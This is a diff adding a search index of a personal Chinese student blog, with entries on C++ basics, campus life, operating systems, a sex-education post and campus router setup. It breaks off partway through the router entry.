@@ -1,0 +1,659 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>c++学习点</title>
+      <link href="/2022/03/09/blogs/cplusplus/"/>
+      <url>/2022/03/09/blogs/cplusplus/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>c++学习中的一些重要知识点</p><span id="more"></span><p>1.基于范围的迭代</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">char</span>* argc[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> site[<span class="number">5</span>] = &#123;<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">char</span> &amp;x: site)<span class="comment">//基于范围的迭代</span></span><br><span class="line">&#123;</span><br><span class="line">    cout&lt;&lt;x&lt;&lt;endl;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    输出</span></span><br><span class="line"><span class="comment">    c</span></span><br><span class="line"><span class="comment">    f</span></span><br><span class="line"><span class="comment">    d</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 人生 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 畅谈 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>【win】更改 Python 的 pip install 默认安装依赖路径</title>
+      <link href="/2022/02/21/blogs/changepipdir/"/>
+      <url>/2022/02/21/blogs/changepipdir/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Thonny —— 一个面向python初学者的 IDE</p><span id="more"></span><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3>]]></content>
+      
+      
+      <categories>
+          
+          <category> 教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> 轉載 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>The reason why I go to school in Hunan</title>
+      <link href="/2021/06/28/blogs/goto-hut-reason/"/>
+      <url>/2021/06/28/blogs/goto-hut-reason/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>有人问我可以去河北省内的大学，为什么还要到湖南那么远的地方？</p><p>其实不光是你在问我，我的内心也在问我自己。</p><p>那不给个理由，心里上也过不去，就说说吧。</p><p>首先是觉得自己没考好（我不认为我后悔了），上了跟同学一个学校的话，很不是滋味，其次是，可以算作一次旅行，毕竟自己也没有去过那么远的地方，然后呢，有时候我也不爱听方</p><p>言，认为讲自己听不懂的方言的人，就是很不好，自己有点偏见吧，希望这次，身处一个方言特别多 的地方，可以打破这种心里偏见。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 校园 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 畅谈 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>单片机学习笔记</title>
+      <link href="/2021/06/05/blogs/danpianji/"/>
+      <url>/2021/06/05/blogs/danpianji/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>由于我对电子比较感兴趣，早年间又接触过win32下的逆向破解，了解点汇编，于是，我决定学习下单片机，顺便丰富下我对电脑汇编的知识。<br>那么，问题来了，学STM32？还是Arduino？还是8051?<br><img src="https://cdn.jsdelivr.net/gh/imaegoo/emotion/bilibili/fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/imaegoo/emotion/bilibili/fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"></p><span id="more"></span><p>一次偶然，我遇见了</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 搞点东西 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 单片机 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>你不知道的那些电脑系统</title>
+      <link href="/2021/06/05/blogs/system/"/>
+      <url>/2021/06/05/blogs/system/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>来，我问问你都知道什么操作系统。<br><img src="https://cdn.jsdelivr.net/gh/imaegoo/emotion/bilibili/6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/imaegoo/emotion/bilibili/6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"><br>什么？你说你只知道windows和Mac OS,再想半天，加个linux,那你也太差劲了吧，<br><img src="https://cdn.jsdelivr.net/gh/imaegoo/emotion/bilibili/09dd16a7aa59b77baa1155d47484409624470c77.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/imaegoo/emotion/bilibili/09dd16a7aa59b77baa1155d47484409624470c77.png" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"><br>今天，咱们就来盘点下那些鲜为人知的电脑操作系统（linux家 常见的服务器系统今天不考虑）😅</p><h3 id="Chromium-OS"><a href="#Chromium-OS" class="headerlink" title="Chromium OS"></a>Chromium OS</h3><p>Chromium OS 是谷歌 Chrome OS 操作系统背后的开源项目，延续了 Chrome（Chromium）浏览器的特性，定位是一个快速、简洁与安全的操作系统。<br><img src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1622866365000.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1622866365000.png" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"><br>优点：轻量，快速<br>缺点：生态不完善，软件比较少<br>可安装软件：安卓，linux<br>官网：<a href="http://www.chromium.org/chromium-os">http://www.chromium.org/chromium-os</a><br>备用地址：<a href="https://www.neverware.com/open-source-software">https://www.neverware.com/open-source-software</a><br>可能需要梯子或者代理</p><h3 id="Phoenix-OS"><a href="#Phoenix-OS" class="headerlink" title="Phoenix OS"></a>Phoenix OS</h3><p>一款基于安卓的多窗口桌面级操作系统<br>网址: <a href="http://www.phoenixos.com/">http://www.phoenixos.com/</a><br>可安装安卓应用，但是现在看来官网不怎么火热了，加载进取都很卡，项目更新度比较差。</p><h3 id="FydeOS"><a href="#FydeOS" class="headerlink" title="FydeOS"></a>FydeOS</h3><p>FydeOS（原名 Flint OS，于 2018 年 6 月正式更名）基于驱动 Chrome OS 及谷歌浏览器的开源项目二次开发，融合自主专利技术，继承 Chrome OS 所有特性，适配更多硬件品类，为中国学生而定制的本土化修改。<br>极速响应永不变慢<br>在一个 OS 平台上更好地运行网页程序 + 安卓程序 + Windows 程序 + Linux 程序<br>账号数据云同步<br>操作简单，安全稳定<br>无打扰式更新<br>在千元机上实现优质体验，流畅使用 5-10 年，超高性价比<br>支持的设备很多，包括树莓派<br><img src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1622867537000.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1622867537000.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"><br>官网：<a href="https://fydeos.com/">https://fydeos.com/</a></p><h3 id="android-x86"><a href="#android-x86" class="headerlink" title="android-x86"></a>android-x86</h3><p>这是把安卓的系统适配了电脑平台，更新非常快，可能适配不完善吧<br><img src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1622868069000.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1622868069000.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"><br>官网地址：<a href="https://www.android-x86.org/">https://www.android-x86.org/</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 资源收集 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 系统 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>16型人格测试</title>
+      <link href="/2021/05/29/blogs/16personalities/"/>
+      <url>/2021/05/29/blogs/16personalities/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>16型人格测试，测试出你是哪个类型的，得到一个具体而准确的对自己的描述，了解你行事方式背后的原因。<br>测试整的很好，但是我还没测，你有空测测吧。</p><p>入口在此：<a href="https://www.16personalities.com/ch/">测试入口</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 人生 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 人生 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>5月日记</title>
+      <link href="/2021/05/29/blogs/21_5/"/>
+      <url>/2021/05/29/blogs/21_5/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>好久没更新文章了额，原因是我的上课的C语言程序设计书借给别人，然后他给弄丢了，</p><p><img src="https://cdn.jsdelivr.net/gh/imaegoo/emotion/bilibili/7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/imaegoo/emotion/bilibili/7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"></p><p>（啊这，好像扯不上任何关系）</p><p>事实是我去搞前端的网址导航了，非常想要一个Vue风格的网址导航，很喜欢<a href="https://gesdh.cn/">格栅导航</a></p><p>这是一个基于 Spring Boot + Vue 前后端分离的导航网站系统，后端需要搭建JAVA环境要有SQL数据库，还要Redis缓存数据库(某个网站可以白嫖5兆空间)，前端还好说，后端需要服务器，虚拟主机肯定不行</p><p>于是，穷的我就只能默默的点个star来了，没办法用，</p><p>用过全静态的，数据全部储存在一个json文件里，但是，用着用着，就觉得太费劲了。手动添加各种东西，太麻烦了，也放弃了。</p><p><img src="https://cdn.jsdelivr.net/gh/imaegoo/emotion/bilibili/9f996894a39e282ccf5e66856af49483f81870f3.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/imaegoo/emotion/bilibili/9f996894a39e282ccf5e66856af49483f81870f3.png" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"></p><p>哎呀，看到另一个Vue项目<a href="https://github.com/geekape/geek-navigation">极客猿梦导航</a>，前端Vue，后端只需要个MongoDB数据库，这个数据库官方可以白嫖500兆的空间，后端部署</p><p>比较简单，这样就可以搬到Heroku（一个提供免费容器服务的平台）上去。</p><p>有了想法，开干，源代码2020年的，过了一年，现在是各种依赖包的问题，不知道为什么作者不维护了，issues不回复，qq群也不回复，无奈。</p><p>只能自己开整，耗时一个月，都整好了，主题也高仿了格栅导航，结果</p><p><img src="https://cdn.jsdelivr.net/gh/imaegoo/emotion/bilibili/23269aeb35f99daee28dda129676f6e9ea87934f.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/imaegoo/emotion/bilibili/23269aeb35f99daee28dda129676f6e9ea87934f.png" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"></p><p>放到Heroku上却出问题了，就是运行不了，看了log，编译正常，不知道那个容器除了什么问题，无奈，只能放弃。</p><p>其实也不算太亏，在搞的过程中，我也明白了好多前端知识，这一整，耽误了单片机学习和C语言的学习。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 搞点东西 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 人生 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>My School</title>
+      <link href="/2021/05/29/blogs/hut/"/>
+      <url>/2021/05/29/blogs/hut/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>这将是一篇贯穿我的大学四年的文章，我将用这一篇文章描绘我大学4年的点点滴滴。</p><span id="more"></span><h3 id="购物"><a href="#购物" class="headerlink" title="购物"></a>购物</h3><p>北苑：<br>配眼镜的话去北苑，有个 精益眼镜店，价格合适，老板态度很好。<br>东苑：<br>就是一个字：贵！<br>“特价”超市，还有“特价餐厅”</p><h3 id="情感"><a href="#情感" class="headerlink" title="情感"></a>情感</h3><p>有个比较好的QQ表白墙,刚来学校的时候，觉着这东西很涨知识，女同性恋，男同性恋。。。。。。。吃各种瓜🍉</p><p>现在就觉着没时间看，知识已经涨完了，也就偶尔吃吃瓜吧。</p><h3 id="课堂"><a href="#课堂" class="headerlink" title="课堂"></a>课堂</h3><p>1.这是近代史结课,作报告的时候，我被偷拍了，（其实也不算偷拍了），光明正大的被拍了 ，摄影：<a href="https://www.xiaohongshu.com/user/profile/5f85865d0000000001001caf">小黄同学</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 校园 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 校园 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>My Middle School</title>
+      <link href="/2021/05/29/blogs/luanpingyizhong/"/>
+      <url>/2021/05/29/blogs/luanpingyizhong/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>我的高中也太行了，都有了自己的宣传片了，在此，我必须要收藏下。</p><span id="more"></span><p>未完待续</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 校园 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 校园 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>那些极品影视</title>
+      <link href="/2021/05/15/blogs/yingshi/"/>
+      <url>/2021/05/15/blogs/yingshi/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一起看看那些剧吧"><a href="#一起看看那些剧吧" class="headerlink" title="一起看看那些剧吧"></a>一起看看那些剧吧</h1><h2 id="1-禁忌女孩"><a href="#1-禁忌女孩" class="headerlink" title="1.禁忌女孩"></a>1.禁忌女孩</h2><h2 id="2-狗十三"><a href="#2-狗十三" class="headerlink" title="2.狗十三"></a>2.狗十三</h2>]]></content>
+      
+      
+      <categories>
+          
+          <category> 娱乐 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 影视 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>大学的日子，我很着迷</title>
+      <link href="/2021/05/05/blogs/daxuederizi/"/>
+      <url>/2021/05/05/blogs/daxuederizi/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>你的大学是什么样子的呢？</p><span id="more"></span><p>大一的我：<br>入学非常期待,想要谈个恋爱,无奈长得<br>不帅,没有胆子搭讪。<br>试试依靠内在,各种套路拉满,学生会和<br>社团,努力表现存在。<br>然而都是扯淡,做事做到手烂,跑腿跑到<br>脚断,妹子当我傻蛋<br>再看学长那块,每日艳遇不断,虽然屁事<br>不干,公费谈情说爱。<br>期未临头大难,高数差点零蛋,最后勉强<br>过关,吓出一身冷汗<br>大一找对象,宣告失败!</p><p>大二的我：<br>决定改头换面,改用投资策略,新生群里<br>踊跃,终于学妹出现<br>自感情窦初开,每日嘘寒问暖,天天约人<br>吃饭,过节礼物不断<br>鼓气勇气表白,学妹眼泪一串,喜欢算是<br>喜欢,但还需要试探<br>饭后试图牵手,她说无法接受,闭蜜都说<br>你丑,保密才能长久<br>吃请礼物照收,观念及其保守,甘愿沦为<br>舔狗,帅哥出手抢走。<br>新欢秒杀旧爱,保守怎能野战?当场搞崩心态,哭到天昏地暗<br>大二经历,太惨太惨</p><p>大三的我:<br>知乎教人提升,看得热血沸腾。健身房里<br>扎根,图书馆里坐镇<br>月月都在考证,天天早起跳绳,只盼知乎<br>是真,从此一帆风顺<br>怎料美梦成真,妹子果直上门。以为偶像<br>学神,实际是工具人<br>聊天只讲学习,见面全是做题,考前郎情<br>妾意,考后人间绝迹。<br>历经各种磨难,每曰长吁短叹。总算回头<br>是岸,单身以保平安。<br>室友很讲义气,带我入坑游戏。人说话又<br>好听,皮肤卖得便宜<br>大三发现,为啥不旱点开始打游戏!<br>大四的我<br>论文不能大意,还要忙着实习,不能荒废<br>游戏,哪有恋爱精力。<br>导师不回微信,工作没有消息,实在有些<br>着急,游戏让我愜意<br>大学读到此处,终于明白清楚。一切都会<br>结束,只有游戏永驻<br>大事一经敲定,立刻游戏不停,匆匆数月<br>过去,毕业悄悄来临<br>离校偶遇学弟,眼神满是精气,想到当年<br>自己,勾起满腔回忆<br>一切都是天意</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 人生 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 畅谈 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>客服亦不易</title>
+      <link href="/2021/05/03/blogs/kefu/"/>
+      <url>/2021/05/03/blogs/kefu/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>碰到了腾讯客服反馈的问卷，那就填填吧</p><span id="more"></span><p>当网友<span class='p blue'>因个人纠纷在QQ上发生谩骂并举报</span>对方，你觉得腾讯举报中心应该如何受理？</p><div class='checkbox'><input type="checkbox" />            <p>个人纠纷无法判断对错，不应该处罚</p>            </div><div class='checkbox'><input type="checkbox" />            <p>视举报证据是否充分而定，证据有效就处理，证据无效就不用处理</p>            </div><div class='checkbox'><input type="checkbox" />            <p>个人纠纷无法判断对错，不需要平台监管</p>            </div><div class='checkbox'><input type="checkbox" />            <p>只要参与了谩骂，就应该进行封禁等处罚</p>            </div><div class='checkbox'><input type="checkbox" />            <p>其他————</p>            </div><div class='checkbox'><input type="checkbox" />            <p>我不太清楚/无所谓</p>            </div><p>我估计我只能勾选最后一个了，不知道大家怎么选</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 人生 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 畅谈 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>一束玫瑰花的联想</title>
+      <link href="/2021/04/23/blogs/flowers/"/>
+      <url>/2021/04/23/blogs/flowers/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>一束花，一个作文题，几篇小说。</p><span id="more"></span><h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>  我在去学校西操场的路上，看见一束花被丢弃在垃圾桶旁边，我没有管，只是悄悄的走了过去。</p><h3 id="发展"><a href="#发展" class="headerlink" title="发展"></a>发展</h3><p>  当晚，就有人发了表白墙，内容是让大家看一看这是怎么回事。<br>  第二天，有人竟然以这花为内容出题，号称让工大学子来答题。</p><h3 id="高潮"><a href="#高潮" class="headerlink" title="高潮"></a>高潮</h3><p>  第三天，投稿纷纷来袭。这里给大家瞧瞧。</p><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3>]]></content>
+      
+      
+      <categories>
+          
+          <category> 人生 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 原创 </tag>
+            
+            <tag> 校园 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>自选cdn白嫖clodflare pro</title>
+      <link href="/2021/04/11/blogs/cdn-byown/"/>
+      <url>/2021/04/11/blogs/cdn-byown/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>想白嫖cloudflare(简称cf)的专业版计划？</p><span id="more"></span><p>那我建议你去看看<span class='btn'><a class="button" href='https://my.cloudraft.cn/' title='云筏科技'>云筏科技</a></span> ，可能会有意想不到的收获，要是自选cf的cdn节点，可以去<a href="https://cf.9sep.org/">https://cf.9sep.org/</a></p><p>备注一些小技巧：</p><p>云火焰公布的ip地址 查看：<a href="https://www.cloudflare.com/zh-cn/ips/">https://www.cloudflare.com/zh-cn/ips/</a></p><p>测速的话，在这个地址进行：<a href="https://www.ce8.com/ping">https://www.ce8.com/ping</a></p><p>关于查看访客的真实ip地址：https://{加速域名}/cdn-cgi/trace</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网站设计 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> cdn </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CTF自学之路</title>
+      <link href="/2021/04/05/blogs/ctf/"/>
+      <url>/2021/04/05/blogs/ctf/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ctf，即所有的信息安全知识，我来了。本文将介绍所有的学习历程。慢慢刷题啦。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ctf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>关于性我想说的话</title>
+      <link href="/2021/03/27/blogs/about-sex/"/>
+      <url>/2021/03/27/blogs/about-sex/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>”性“，一个中国人不愿意提起的事，一个令人面目改色的词。ヾ(´･ ･｀｡)ノ”</p><p>这次，我来说。</p><span id="more"></span><p>或许，有人认为女孩有月经就认为是羞耻的⌇●﹏●⌇，又或许，每次生理课都自学成才╮(╯▽╰)╭ 。</p><p>又或者，你是否和我一样，每次到卖卫生巾的地方就匆匆离开，不敢稍加停留。<br><img src="https://cdn.jsdelivr.net/npm/chenyfan-oss@1.1.8/%E5%96%9C%E6%9E%81%E8%80%8C%E6%B3%A3.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/npm/chenyfan-oss@1.1.8/%E5%96%9C%E6%9E%81%E8%80%8C%E6%B3%A3.png" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"><br>还有为什么女孩纸买个卫生巾要必须用个不透明的袋子装起来？！！<br><img src="https://cdn.jsdelivr.net/npm/chenyfan-oss@1.1.8/%E6%97%A0%E5%A5%88.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/npm/chenyfan-oss@1.1.8/%E6%97%A0%E5%A5%88.png" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"><br>究竟怎样，我们才能真的不再有性的歧视？我不知道，可能要很长时间吧。<br>之前看的日本的片子–17.3关于性，我觉得非常好看。<br><img src="https://cdn.jsdelivr.net/npm/chenyfan-oss@1.1.11/20.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/npm/chenyfan-oss@1.1.11/20.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"><br>在中国来说，很大胆，我觉得在中国，反正这个一百年是不可能出现的。很有教育意义，<br>这次给大家安排的教育片子是《开得了口：家长性教育课程》。</p><span class='btn center large'><a class="button" href='https://www.feimooc.com/course/210' title='开始观看'><i class='fas fa-download'></i>开始观看</a></span><p>小孩看了不烧脑，大人看了不上头。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 人生 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 畅谈 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>大一下学期规划</title>
+      <link href="/2021/03/22/blogs/flag1/"/>
+      <url>/2021/03/22/blogs/flag1/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="大一下学期"><a href="#大一下学期" class="headerlink" title="大一下学期"></a>大一下学期</h3><p>1.学习完<a href="https://studyh5.zhihuishu.com/videoStudy.html#/studyVideo?recruitAndCourseId=4951505142524258454a5859514d504b&studyStatus=0">51单片机</a></p><p>2.学习完c语言</p><p>3.看完慕课上的2个大学计算机基础课程</p><h3 id="大二上学期"><a href="#大二上学期" class="headerlink" title="大二上学期"></a>大二上学期</h3><p>1.web安全课</p><p>2.计算机网络（韩立刚）</p><p>3.计算机操作系统</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 人生 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 目标 </tag>
+            
+            <tag> 原创 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>“hut专用路由器”捣鼓教程</title>
+      <link href="/2021/03/16/blogs/hut_router/"/>
+      <url>/2021/03/16/blogs/hut_router/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>早在大一开学，我就在某宝买了40元的二手极路由1s路由器，刷的是H大的老毛子系统，今天介绍介绍捣鼓的经历。</p><span id="more"></span><p><img src="https://cdn.jsdelivr.net/npm/chenyfan-oss@1.1.8/5c53d1904dcb2.gif" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/npm/chenyfan-oss@1.1.8/5c53d1904dcb2.gif" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"></p><h3 id="安装老毛子"><a href="#安装老毛子" class="headerlink" title="安装老毛子"></a>安装老毛子</h3><p>1.学校用的锐捷认证，所以我们要安装上mentohust插件，这个插件是专门对付锐捷认证的，不会装，不用担心，这个路由器固件已经内置好了，上次搞了openwrt系统，结果那个系统对mentohust插件很不友好，还得捣鼓，太麻烦<img src="https://cdn.jsdelivr.net/npm/chenyfan-oss@1.1.11/194.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/npm/chenyfan-oss@1.1.11/194.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"></p><h3 id="配置插件"><a href="#配置插件" class="headerlink" title="配置插件"></a>配置插件</h3><p>2.配置如下：[每个学校可能都不要一样]（举个例子）<br> 用户名：20406000607@电信<br>组播地址：1锐捷<br>dhcp方式：1二次认证<br>是否后台：是<br>版本号：4.96<br>其他的设置项默认就行<br>3.然后开启插件，应用。</p>]]></content>
+      
+      
